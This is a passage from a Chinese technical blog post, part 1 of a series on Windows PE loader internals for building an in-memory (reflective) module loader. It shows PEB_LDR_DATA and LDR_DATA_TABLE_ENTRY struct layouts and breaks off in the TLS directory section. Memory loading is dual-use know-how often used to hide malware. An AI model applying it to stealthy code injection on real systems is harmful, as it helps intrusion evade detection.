xml:base="https://citrusice.github.io/posts/from-memory-loading-to-everyting-part-1/">&lt;p&gt;我接触 Windows 最开始看的两本书是《PE 权威指南》和《Windows 核心编程》，学这两本书的目的也很简单：实现内存加载。我们知道，要实现内存加载，最重要的是处理 PE 中的三个表：导入表，iat 和重定位表。然而跟 pe 装载有关系的表却不仅仅只有这三个，那么剩下的表都有着怎样的内容？在 PE 的装在过程中发挥了什么样的作用？&lt;/p&gt;

&lt;p&gt;毫无疑问，仅仅处理导入表和重定位表的内存加载是不完美的，只能实现部分 pe 的加载。&lt;/p&gt;

&lt;p&gt;这个系列目的在于提供 pe 装载部分细节的&lt;strong&gt;索引&lt;/strong&gt;，希望读者能通过这些索引去更深入的学习，以实现完美的内存加载技术。当然，不会有现成的代码，甚至不会有太多细节。&lt;/p&gt;

&lt;p&gt;对 pe 这些表的了解过程一定程度上也代表了我的二进制学习历程。&lt;/p&gt;

&lt;h1 id=&quot;peb_ldr_data&quot;&gt;PEB_LDR_DATA&lt;/h1&gt;

&lt;p&gt;尽管 PEB_LDR_DATA 并非是 pe 中的一个表，但是它记录了当前进程中到底有哪些模块被装载，如果要实现完美的内存加载，它是少不了的，因为 GetModuleHandle 是依赖于 LdrpCheckForLoadedDll ，而 LdrpCheckForLoadedDll 最终就是检查 PEB_LDR_DATA。&lt;/p&gt;

&lt;p&gt;另外，如果要将内存加载的模块设置为主模块，需要修改 ` (HMODULE)(PVOID)NtCurrentPeb()-&amp;gt;ImageBaseAddress`&lt;/p&gt;

&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;//0x58 bytes (sizeof)&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;_PEB_LDR_DATA&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;ULONG&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Length&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;                                                           &lt;span class=&quot;c1&quot;&gt;//0x0&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;UCHAR&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Initialized&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;                                                      &lt;span class=&quot;c1&quot;&gt;//0x4&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;VOID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SsHandle&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;                                                         &lt;span class=&quot;c1&quot;&gt;//0x8&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;_LIST_ENTRY&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;InLoadOrderModuleList&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;                               &lt;span class=&quot;c1&quot;&gt;//0x10&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;_LIST_ENTRY&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;InMemoryOrderModuleList&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;                             &lt;span class=&quot;c1&quot;&gt;//0x20&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;_LIST_ENTRY&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;InInitializationOrderModuleList&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;                     &lt;span class=&quot;c1&quot;&gt;//0x30&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;VOID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;EntryInProgress&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;                                                  &lt;span class=&quot;c1&quot;&gt;//0x40&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;UCHAR&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ShutdownInProgress&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;                                               &lt;span class=&quot;c1&quot;&gt;//0x48&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;VOID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ShutdownThreadId&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;                                                 &lt;span class=&quot;c1&quot;&gt;//0x50&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt; 

&lt;span class=&quot;c1&quot;&gt;//0x120 bytes (sizeof)&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;_LDR_DATA_TABLE_ENTRY&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;_LIST_ENTRY&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;InLoadOrderLinks&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;                                    &lt;span class=&quot;c1&quot;&gt;//0x0&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;_LIST_ENTRY&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;InMemoryOrderLinks&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;                                  &lt;span class=&quot;c1&quot;&gt;//0x10&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;_LIST_ENTRY&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;InInitializationOrderLinks&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;                          &lt;span class=&quot;c1&quot;&gt;//0x20&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;VOID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;DllBase&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;                                                          &lt;span class=&quot;c1&quot;&gt;//0x30&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;VOID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;EntryPoint&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;                                                       &lt;span class=&quot;c1&quot;&gt;//0x38&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;ULONG&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SizeOfImage&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;                                                      &lt;span class=&quot;c1&quot;&gt;//0x40&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;_UNICODE_STRING&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;FullDllName&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;                                     &lt;span class=&quot;c1&quot;&gt;//0x48&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;_UNICODE_STRING&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;BaseDllName&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;                                     &lt;span class=&quot;c1&quot;&gt;//0x58&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;union&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;UCHAR&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;FlagGroup&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;                                                 &lt;span class=&quot;c1&quot;&gt;//0x68&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;ULONG&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Flags&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;                                                        &lt;span class=&quot;c1&quot;&gt;//0x68&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;ULONG&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;PackagedBinary&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;                                         &lt;span class=&quot;c1&quot;&gt;//0x68&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;ULONG&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;MarkedForRemoval&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;                                       &lt;span class=&quot;c1&quot;&gt;//0x68&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;ULONG&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ImageDll&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;                                               &lt;span class=&quot;c1&quot;&gt;//0x68&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;ULONG&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;LoadNotificationsSent&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;                                  &lt;span class=&quot;c1&quot;&gt;//0x68&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;ULONG&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;TelemetryEntryProcessed&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;                                &lt;span class=&quot;c1&quot;&gt;//0x68&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;ULONG&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ProcessStaticImport&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;                                    &lt;span class=&quot;c1&quot;&gt;//0x68&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;ULONG&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;InLegacyLists&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;                                          &lt;span class=&quot;c1&quot;&gt;//0x68&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;ULONG&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;InIndexes&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;                                              &lt;span class=&quot;c1&quot;&gt;//0x68&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;ULONG&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ShimDll&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;                                                &lt;span class=&quot;c1&quot;&gt;//0x68&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;ULONG&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;InExceptionTable&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;                                       &lt;span class=&quot;c1&quot;&gt;//0x68&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;ULONG&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ReservedFlags1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;                                         &lt;span class=&quot;c1&quot;&gt;//0x68&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;ULONG&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;LoadInProgress&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;                                         &lt;span class=&quot;c1&quot;&gt;//0x68&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;ULONG&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;LoadConfigProcessed&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;                                    &lt;span class=&quot;c1&quot;&gt;//0x68&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;ULONG&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;EntryProcessed&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;                                         &lt;span class=&quot;c1&quot;&gt;//0x68&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;ULONG&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ProtectDelayLoad&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;                                       &lt;span class=&quot;c1&quot;&gt;//0x68&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;ULONG&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ReservedFlags3&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;                                         &lt;span class=&quot;c1&quot;&gt;//0x68&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;ULONG&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;DontCallForThreads&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;                                     &lt;span class=&quot;c1&quot;&gt;//0x68&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;ULONG&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ProcessAttachCalled&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;                                    &lt;span class=&quot;c1&quot;&gt;//0x68&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;ULONG&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ProcessAttachFailed&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;                                    &lt;span class=&quot;c1&quot;&gt;//0x68&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;ULONG&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CorDeferredValidate&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;                                    &lt;span class=&quot;c1&quot;&gt;//0x68&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;ULONG&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CorImage&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;                                               &lt;span class=&quot;c1&quot;&gt;//0x68&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;ULONG&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;DontRelocate&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;                                           &lt;span class=&quot;c1&quot;&gt;//0x68&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;ULONG&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CorILOnly&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;                                              &lt;span class=&quot;c1&quot;&gt;//0x68&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;ULONG&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ChpeImage&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;                                              &lt;span class=&quot;c1&quot;&gt;//0x68&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;ULONG&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ReservedFlags5&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;                                         &lt;span class=&quot;c1&quot;&gt;//0x68&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;ULONG&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Redirected&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;                                             &lt;span class=&quot;c1&quot;&gt;//0x68&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;ULONG&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ReservedFlags6&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;                                         &lt;span class=&quot;c1&quot;&gt;//0x68&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;ULONG&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CompatDatabaseProcessed&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;                                &lt;span class=&quot;c1&quot;&gt;//0x68&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;USHORT&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ObsoleteLoadCount&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;                                               &lt;span class=&quot;c1&quot;&gt;//0x6c&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;USHORT&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;TlsIndex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;                                                        &lt;span class=&quot;c1&quot;&gt;//0x6e&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;_LIST_ENTRY&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;HashLinks&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;                                           &lt;span class=&quot;c1&quot;&gt;//0x70&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;ULONG&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;TimeDateStamp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;                                                    &lt;span class=&quot;c1&quot;&gt;//0x80&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;_ACTIVATION_CONTEXT&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;EntryPointActivationContext&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;                &lt;span class=&quot;c1&quot;&gt;//0x88&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;VOID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Lock&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;                                                             &lt;span class=&quot;c1&quot;&gt;//0x90&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;_LDR_DDAG_NODE&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;DdagNode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;                                        &lt;span class=&quot;c1&quot;&gt;//0x98&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;_LIST_ENTRY&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;NodeModuleLink&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;                                      &lt;span class=&quot;c1&quot;&gt;//0xa0&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;_LDRP_LOAD_CONTEXT&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;LoadContext&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;                                 &lt;span class=&quot;c1&quot;&gt;//0xb0&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;VOID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ParentDllBase&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;                                                    &lt;span class=&quot;c1&quot;&gt;//0xb8&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;VOID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SwitchBackContext&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;                                                &lt;span class=&quot;c1&quot;&gt;//0xc0&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;_RTL_BALANCED_NODE&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;BaseAddressIndexNode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;                         &lt;span class=&quot;c1&quot;&gt;//0xc8&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;_RTL_BALANCED_NODE&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;MappingInfoIndexNode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;                         &lt;span class=&quot;c1&quot;&gt;//0xe0&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;ULONGLONG&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;OriginalBase&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;                                                 &lt;span class=&quot;c1&quot;&gt;//0xf8&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;union&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_LARGE_INTEGER&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;LoadTime&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;                                          &lt;span class=&quot;c1&quot;&gt;//0x100&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;ULONG&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;BaseNameHashValue&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;                                                &lt;span class=&quot;c1&quot;&gt;//0x108&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;enum&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_LDR_DLL_LOAD_REASON&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;LoadReason&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;                                   &lt;span class=&quot;c1&quot;&gt;//0x10c&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;ULONG&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ImplicitPathOptions&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;                                              &lt;span class=&quot;c1&quot;&gt;//0x110&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;ULONG&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ReferenceCount&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;                                                   &lt;span class=&quot;c1&quot;&gt;//0x114&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;ULONG&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;DependentLoadFlags&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;                                               &lt;span class=&quot;c1&quot;&gt;//0x118&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;UCHAR&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SigningLevel&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;                                                     &lt;span class=&quot;c1&quot;&gt;//0x11c&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt; 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h1 id=&quot;tls-表&quot;&gt;TLS 表&lt;/h1&gt;

&lt;p&gt;Windows TLS (Thread Local Storage) 机制意在为每个线程提供的独立的存储空间，分为动态 TLS 和静态 TLS，动态 TLS 自然不必多说，通过 Windows Api 实现，而静态 TLS 则关乎 PE 的 TLS 表。&lt;/p&gt;

&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;typedef&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;_IMAGE_TLS_DIRECTORY64&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;ULONGLONG&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;StartAddressOfRawData&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;ULONGLONG&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;EndAddressOfRawData&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;ULONGLONG&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;AddressOfIndex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;         &lt;span class=&quot;c1&quot;&gt;// PDWORD&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;ULONGLONG&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;AddressOfCallBacks&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;     &lt;span class=&quot;c1&quot;&gt;// PIMAGE_TLS_CALLBACK *;&lt;/span&gt;
